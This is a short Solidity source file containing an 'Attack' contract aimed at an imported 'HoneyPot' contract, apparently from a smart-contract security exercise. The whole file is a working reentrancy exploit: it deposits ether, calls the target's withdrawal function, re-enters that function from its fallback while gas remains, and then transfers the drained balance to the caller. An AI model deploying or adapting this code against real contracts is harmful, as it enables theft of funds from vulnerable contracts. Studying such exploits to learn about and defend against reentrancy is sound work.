pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract Attack{

    function initAttack(address _honeypot) public payable{

        require(msg.value > 0);
        uint initialBalance = msg.value;
        HoneyPot(_honeypot).put.value(msg.value)();
        HoneyPot(_honeypot).get();
        require(address(this).balance >= initialBalance);
        msg.sender.transfer(address(this).balance);
    }

    function () public payable{
        
        if(msg.sender.balance >= msg.value && gasleft() >= 20000)
            HoneyPot(msg.sender).get();
    }
}